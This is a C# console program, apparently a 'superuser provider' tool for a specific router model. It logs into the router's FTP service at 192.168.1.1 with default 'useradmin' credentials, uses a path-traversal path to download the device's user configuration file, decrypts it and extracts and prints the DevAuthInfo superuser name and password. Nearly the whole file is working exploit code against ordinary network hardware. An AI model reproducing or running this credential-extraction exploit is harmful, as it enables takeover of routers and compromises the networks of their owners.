using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using FluentFTP;

namespace sk_d748_c_superuser_provider
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("init ftp client to 192.168.1.1");
            var ftpClient = new FtpClient("ftp://192.168.1.1","useradmin","useradmin",21);
            try
            {
                Console.WriteLine("try get user data");
                ftpClient.Connect();
                ftpClient.DownloadBytes(out byte[] OutBytes,"../userconfig/cfg/db_user_cfg.xml");
                var decryCrc = CRC.CfgFileDecryCRC(OutBytes);
                string user_data = Encoding.UTF8.GetString(decryCrc);
                var superUser = getSuperUser(user_data);
                Console.WriteLine($"username: {superUser[0]}");
                Console.WriteLine($"passwd: {superUser[1]}");
                Console.ReadKey();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.WriteLine("getting files failed");
                Console.WriteLine("Press any key to continue...");
                Console.ReadKey();
            }
        }

        static string[] getSuperUser(string data)
        {
            int root_len = data.IndexOf("name=\"DevAuthInfo\"");
            string sub1_data = data.Substring(root_len, data.IndexOf("</Row>", root_len)-root_len);
            var username_len = sub1_data.IndexOf("name=\"User\"");
            string username_data = sub1_data.Substring(sub1_data.LastIndexOf("<", username_len),sub1_data.IndexOf(">",username_len)-sub1_data.LastIndexOf("<", username_len)+1);
            var pass_len = sub1_data.IndexOf("name=\"Pass\"");
            string pass_data = sub1_data.Substring(sub1_data.LastIndexOf("<", pass_len),sub1_data.IndexOf(">",pass_len)-sub1_data.LastIndexOf("<",pass_len)+1);
            var pass = Regex.Match(pass_data,"(?<=val=\")[^\"]*(?=\")").Value;
            var username = Regex.Match(username_data, "(?<=val=\")[^\"]*(?=\")").Value;
            return new string[2] { username, pass };
        }
    }
}
